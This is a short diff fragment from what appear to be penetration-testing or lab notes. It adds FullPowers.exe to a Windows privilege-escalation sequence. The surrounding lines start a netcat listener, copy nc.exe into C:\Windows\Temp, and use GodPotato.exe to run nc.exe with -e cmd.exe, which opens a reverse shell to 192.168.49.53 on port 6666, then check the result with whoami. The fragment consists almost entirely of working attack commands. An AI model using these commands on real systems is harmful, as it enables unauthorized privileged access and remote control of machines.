@@ -224,6 +224,7 @@ nc -nvlp 6666
 
 # as victim
 copy C:\wamp\www\nc.exe C:\Windows\Temp\nc.exe
+FullPowers.exe
 GodPotato.exe -cmd "C:\Windows\Temp\nc.exe 192.168.49.53 6666 -e cmd.exe"
 whoami
 
